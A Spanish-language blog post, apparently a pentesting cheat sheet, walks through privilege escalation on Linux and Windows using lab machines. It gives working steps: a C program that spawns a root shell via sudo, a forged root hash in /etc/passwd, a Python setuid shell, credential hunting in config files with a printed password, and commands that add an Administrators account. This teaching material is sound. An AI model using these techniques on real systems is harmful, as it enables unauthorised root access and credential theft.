---
date: 2021-11-15T01:14:05.000Z
layout: post
comments: true
title: Escalar privilegios
subtitle: 'para obtener acceso a root o a NT authority system'
description: >-
image: >-
  http://imgfz.com/i/pLYBOku.png
optimized_image: >-
  http://imgfz.com/i/pLYBOku.png
category: ciberseguridad
tags:
  - escalada
  - privilegios
  - root
  - NTauthoritysystem
  - hacking
author: Felipe Canales Cayuqueo
paginate: true
---

El usuario root en Linux es el usuario que posee mayor nivel de privilegios. De hecho, es el único que tiene privilegios sobre todo el sistema en su globalidad, así como el responsable de las tareas administrativas.

De este modo, cuando tu, o cualquier programa, quiera llevar a cabo una acción que requiera permisos de superusuario, de alguna manera se les tendrá que conceder o denegar estos privilegios. Pero la pregunta es si soy un usuario común, ¿puedo ser root, sin necesidad de contraseña?. La respuesta es que si con ciertos pasos que veremos a continuación aprovechando las vulnerabilidades que dejan los usuarios administradores.

# Linux

## Sudo

Una manera de escalar privilegios es a través del siguiente comando:

```bash
┌─[user@user]─[/]
└──╼ sudo -l
```
y ahí aparecerá un binario en el cuál podremos obtener acceso root siguiendo los pasos que nos indican en [GTFOBins](https://gtfobins.github.io/) en algunos casos.

### Ejemplo

```bash
┌─[user@user]─[/]
└──╼ sudo -l
Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on corrosion:
    (root) PASSWD: /home/randy/tools/easysysinfo
```

Al obtener ese resultado nos debemos dirigir al directorio a observar de que se trata:

```bash
┌─[user@user]─[/tools]
└──╼ ls
easysysinfo  easysysinfo.py 
```

En este caso tenemos permisos para remover el archivo, por lo que lo eliminamos y creamos un binario por medio de C como el siguiente:

```C
// Nombre del archivo: test.c

#include <stdlib.h>

int main() {
    system("/bin/bash");
    return 0;
}
```

Y lo compilamos y movemos en la carpeta de tools en caso sea necesario, para posteriormente ejecutarlo:

```bash
┌─[user@user]─[/tools]
└──╼ gcc test.c -o easysysinfo

┌─[user@user]─[/tools]
└──╼ ls
easysysinfo  easysysinfo.py  test.c

┌─[user@user]─[/tools]
└──╼ sudo -u root /home/randy/tools/easysysinfo

┌─[root@user]─[/tools#]
└──╼ whoami
root
```

Y finalmente obtenemos acceso como usuario root, por lo que el programa funciona correctamente.


## Información del sistema

```bash
┌─[user@user]─[/]
└──╼ uname -a
Linux 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
```
Y a través de esto, podemos encontrar vulnerabilidades para escalar privilegios en el sistema.


## SUID

Otra manera es buscando en /usr/bin, algún binario que contenga un permiso cuyo carácter sea ```s``` en lugar de ```x```.

```bash
┌─[user@user]─[/]
└──╼ ls -l /usr/bin/passwd
-rwsr-xr-x 1 root root 45420 May 17  2017 /usr/bin/passwd
```

Ahora también podemos buscar todos los binarios SUID a través de ```find```, con el siguiente comando:

```bash
┌─[user@user]─[/]
└──╼ find / -type f -user root -perm -4000 2>/dev/null
/var/htb/bin/emergency
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/mtr
/usr/sbin/pppd
/bin/ping
/bin/ping6
/bin/su
/bin/fusermount
/bin/mount
/bin/umount
```

### Ejemplo

Una vez detectamos algunos binarios que nos sirva (en este caso ```/usr/bin/passwd```), procedemos a elevar privilegios, a través de openssl:

```bash
┌─[user@user]─[/]
└──╼ openssl passwd -1 -salt root root
$1$root$9gr5KxwuEdiI80GtIzd.U0
```
Lo que recibimos anteriormente lo copiamos y lo reemplazamos por la ```x``` que aparece en root del ```/etc/passwd```

```bash
┌─[user@user]─[/]
└──╼ nano /etc/passwd
GNU nano 3.2                                        /etc/passwd                                 

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
```

```bash
GNU nano 3.2                                        /etc/passwd                               

root:$1$root$9gr5KxwuEdiI80GtIzd.U0:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
```

Finalmente nos transformamos en root, a través de los datos que asignamos por openssl:

```bash
┌─[user@user]─[/]
└──╼ su root
Contraseña: root

┌─[root@user]─[#]
└──╼ whoami
root
```

## Puertos abiertos en la máquina

```bash
┌─[user@user]─[/]
└──╼ ss -lnpt
State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process                                                                         
LISTEN    0         128                0.0.0.0:23               0.0.0.0:*        users:(("python3",pid=829,fd=3))                                               
LISTEN    0         4096             127.0.0.1:631              0.0.0.0:*                                                                                       
LISTEN    0         4096                 [::1]:631                 [::]:*                                                                                       
```
En este caso hay una página web en la máquina la cual podremos visualizar por medio de [chisel](https://github.com/jpillora/chisel).

## Binarios

Otra forma de hacerlo es chequear que binarios contienen permisos de ejecución para un usuario:

```bash
┌─[user@user]─[/]
└──╼ ls -l /bin/ | grep rwxrwx
lrwxrwxrwx 1 root   root           8 Mar 13  2020 pydoc3 -> pydoc3.8
lrwxrwxrwx 1 root   root          12 Mar 13  2020 pygettext3 -> pygettext3.8
lrwxrwxrwx 1 root   root           9 Mar 13  2020 python3 -> python3.8
lrwxrwxrwx 1 root   root          16 Mar 13  2020 python3-config -> python3.8-config
lrwxrwxrwx 1 root   root          33 Jan 27  2021 python3.8-config -> x86_64-linux-gnu-python3.8-config
```

Aquí podríamos escalar privilegios a través de ```Python```, siguiendo los pasos que nos muestran en [GTFOBins](https://gtfobins.github.io/).

```bash
┌─[user@user]─[/]
└──╼ python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'

┌─[root@root]─[/]
└──╼ whoami
root
```

## Contraseñas en la configuración web

Se pueden encontrar credenciales válidas a través del directorio de la configuración de un servidor web:

```bash
user@linux:~/myapi/config$ grep -r -i password
grep -r -i password
environments/production/database.json:        "password": "${process.env.DATABASE_PASSWORD || ''}",
environments/development/database.json:        "password": "#J!:F9Zt2u"
environments/staging/database.json:        "password": "${process.env.DATABASE_PASSWORD || ''}",


user@linux:~/myapi/config$ cat environments/development/database.json
cat environments/development/database.json
{
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
      },
      "options": {}
    }
  }
}


user@linux:~/myapi/config$ mysql -udeveloper -p
mysql -u developer -p
Enter password: #J!:F9Zt2u
```

## Historial

El comando ```history``` en un shell de Linux como Bash (Bourne-Again SHell) muestra un historial de los comandos que has ejecutado previamente. Este historial se almacena en un archivo en tu directorio de inicio, generalmente denominado ```.bash_history```. En ocasiones es posible visualizar contraseñas o información sensible que nos permita escalar privilegios.

# Windows

## Información del sistema

En el caso de Windows se podría realizar a través de ```systeminfo```, para así poder averiguar vulnerabilidades del sistema:

```
C:\> systeminfo
systeminfo

Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00477-001-0000421-84900
Original Install Date:     22/3/2017, 11:09:45   
System Boot Time:          29/12/2017, 3:34:21   
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2600 Mhz
                           [02]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2600 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 5/4/2016
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     1.024 MB
Available Physical Memory: 88 MB
Virtual Memory: Max Size:  2.048 MB
Virtual Memory: Available: 1.085 MB
Virtual Memory: In Use:    963 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.11
```

![1](http://imgfz.com/i/rFQc3RH.png)

## Windows-Exploit-Suggester

Otra forma es por medio de [windows-exploit-suggester.py](https://github.com/AonCyberLabs/Windows-Exploit-Suggester/), el cual funciona extrayendo la información del sistema. Por ejemplo en este caso lo realizamos en ```systeminfo.txt```, para luego continuar con los siguientes pasos:

```bash
┌─[root@kali]─[/Windows-Exploit-Suggester]
└──╼ nano systeminfo.txt
systeminfo

Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36 ??
System Boot Time:          6/6/2022, 2:52:26 ??
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2295 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB
Available Physical Memory: 3.456 MB
Virtual Memory: Max Size:  5.503 MB
Virtual Memory: Available: 4.664 MB
Virtual Memory: In Use:    839 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              \\OPTIMUM
Hotfix(s):                 31 Hotfix(s) Installed.
                           [01]: KB2959936
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2920189
                           [05]: KB2928120
                           [06]: KB2931358
                           [07]: KB2931366
                           [08]: KB2933826
                           [09]: KB2938772
                           [10]: KB2949621
                           [11]: KB2954879
                           [12]: KB2958262
                           [13]: KB2958263
                           [14]: KB2961072
                           [15]: KB2965500
                           [16]: KB2966407
                           [17]: KB2967917
                           [18]: KB2971203
                           [19]: KB2971850
                           [20]: KB2973351
                           [21]: KB2973448
                           [22]: KB2975061
                           [23]: KB2976627
                           [24]: KB2977629
                           [25]: KB2981580
                           [26]: KB2987107
                           [27]: KB2989647
                           [28]: KB2998527
                           [29]: KB3000850
                           [30]: KB3003057
                           [31]: KB3014442
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.8
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.

┌─[root@kali]─[/Windows-Exploit-Suggester]
└──╼ python2 windows-exploit-suggester.py --update 

┌─[root@kali]─[/Windows-Exploit-Suggester]
└─ ls
2021-04-16-mssb.xls  2022-05-31-mssb.xls  LICENSE.md  README.md  windows-exploit-suggester.py  systeminfo.txt

┌─[root@kali]─[/Windows-Exploit-Suggester]
└─ python2 windows-exploit-suggester.py -d 2022-05-31-mssb.xls -i systeminfo.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
[*] there are now 246 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2012 R2 64-bit'
[*] 
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]   https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]   https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]   https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*] 
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
[*] 
[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
[*]   https://github.com/foxglovesec/RottenPotato
[*]   https://github.com/Kevin-Robertson/Tater
[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
[*] 
[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
[*]   https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
[*]   https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
[*] 
[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
[*]   https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
[*] 
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
[*] 
[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC
[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC
[*] 
[E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
[*]   Windows 7 SP1 x86 - Privilege Escalation (MS16-014), https://www.exploit-db.com/exploits/40039/, PoC
[*] 
[E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
[*]   https://www.exploit-db.com/exploits/39232/ -- Microsoft Windows devenum.dll!DeviceMoniker::Load() - Heap Corruption Buffer Underflow (MS16-007), PoC
[*]   https://www.exploit-db.com/exploits/39233/ -- Microsoft Office / COM Object DLL Planting with WMALFXGFXDSP.dll (MS-16-007), PoC
[*] 
[E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important
[*]   https://www.exploit-db.com/exploits/38968/ -- Microsoft Office / COM Object DLL Planting with comsvcs.dll Delay Load of mqrt.dll (MS15-132), PoC
[*]   https://www.exploit-db.com/exploits/38918/ -- Microsoft Office / COM Object els.dll DLL Planting (MS15-134), PoC
[*] 
[E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
[*]   https://www.exploit-db.com/exploits/39698/ -- Internet Explorer 9/10/11 - CDOMStringDataList::InitFromString Out-of-Bounds Read (MS15-112)
[*] 
[E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
[*]   https://www.exploit-db.com/exploits/38474/ -- Windows 10 Sandboxed Mount Reparse Point Creation Mitigation Bypass (MS15-111), PoC
[*] 
[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
[*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
[*] 
[E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical
[*]   https://www.exploit-db.com/exploits/38198/ -- Windows 10 Build 10130 - User Mode Font Driver Thread Permissions Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38199/ -- Windows NtUserGetClipboardAccessToken Token Leak, PoC
[*] 
[M] MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical
[*]   https://www.exploit-db.com/exploits/38222/ -- MS15-078 Microsoft Windows Font Driver Buffer Overflow
[*] 
[E] MS15-052: Vulnerability in Windows Kernel Could Allow Security Feature Bypass (3050514) - Important
[*]   https://www.exploit-db.com/exploits/37052/ -- Windows - CNG.SYS Kernel Security Feature Bypass PoC (MS15-052), PoC
[*] 
[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
[*] 
[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC
[*] 
[E] MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege (3023266) - Important
[*]   http://www.exploit-db.com/exploits/35661/ -- Windows 8.1 (32/64 bit) - Privilege Escalation (ahcache.sys/NtApphelpCacheControl), PoC
[*] 
[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC
[*] 
[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer <= 11 - OLE Automation Array Remote Code Execution (#1), PoC
[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer < 11 - OLE Automation Array Remote Code Execution (MSF), MSF
[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF
[*] 
[M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important
[*]   http://www.exploit-db.com/exploits/35055/ -- Windows OLE - Remote Code Execution 'Sandworm' Exploit (MS14-060), PoC
[*]   http://www.exploit-db.com/exploits/35020/ -- MS14-060 Microsoft Windows OLE Package Manager Code Execution, MSF
[*] 
[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
[*] 
[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
[*] done
```

### Nota

Para poder ocupar ```windows-exploit-suggester.py```, es necesario instalar lo siguiente en python2:

```bash
┌─[root@kali]─[/Windows-Exploit-Suggester]
└──╼ wget https://bootstrap.pypa.io/pip/2.7/get-pip.py

--2022-05-31 00:48:23--  https://bootstrap.pypa.io/pip/2.7/get-pip.py
Resolving bootstrap.pypa.io (bootstrap.pypa.io)... 151.101.220.175, 2a04:4e42:34::175
Connecting to bootstrap.pypa.io (bootstrap.pypa.io)|151.101.220.175|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1908226 (1.8M) [text/x-python]
Saving to: ‘get-pip.py’

get-pip.py                    100%[==============================================>]   1.82M  --.-KB/s    in 0.07s   

2022-05-31 00:48:24 (25.5 MB/s) - ‘get-pip.py’ saved [1908226/1908226]

┌─[root@kali]─[/Windows-Exploit-Suggester]
└──╼ python2 get-pip.py
Collecting pip<21.0
  Using cached pip-20.3.4-py2.py3-none-any.whl (1.5 MB)
Installing collected packages: pip
  Attempting uninstall: pip
    Found existing installation: pip 20.3.4
    Uninstalling pip-20.3.4:
      Successfully uninstalled pip-20.3.4
Successfully installed pip-20.3.4

┌─[root@kali]─[/Windows-Exploit-Suggester]
└──╼ pip2 install --user xlrd==1.1.0
ollecting xlrd==1.1.0
  Downloading xlrd-1.1.0-py2.py3-none-any.whl (108 kB)
     |████████████████████████████████| 108 kB 5.8 MB/s 
Installing collected packages: xlrd
Successfully installed xlrd-1.1.0
```
Una vez realizado esto, deberías poder ocuparlo sin problemas.

## Permisos de usuario

Se pueden ver que privilegios tiene el usuario a través del siguiente comando:

```
C:\> whoami /priv
```

## Local Group

A través de ver en que grupo se encuentra el usuario se pueden encontrar vías potenciales para escalar privilegios:

```
C:\> net user <user>
```


Ejemplo:

```
C:\> net user svc-printer
User name                    svc-printer
Full Name                    SVCPrinter
Comment                      Service Account for Printer
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 1:15:13 AM
Password expires             Never
Password changeable          5/27/2021 1:15:13 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/16/2021 10:01:36 AM

Logon hours allowed          All

Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
The command completed successfully.
```
Al ver que el usuario está en el grupo ```Server Operators```, se encuentra una vía donde poder realizar la escalada de privilegio a través de ```binPath```.

## Creación de nueva cuenta

Ejecutar comando para crear un nuevo usuario llamado "Test". Cualquiera de las siguiente opciones sirve, en el caso del ```*``` es para escribir una contraseña.

```
C:\> net user Test /add
```

```
C:\> net user Test * /add
```

## Añadir una cuenta al grupo de Administradores

El siguiente caso tiene como objetivo añadir un usuario local al grupo "Administrators" en una máquina con Windows.

```
C:\> net localgroup Administrators <user> /Add
```
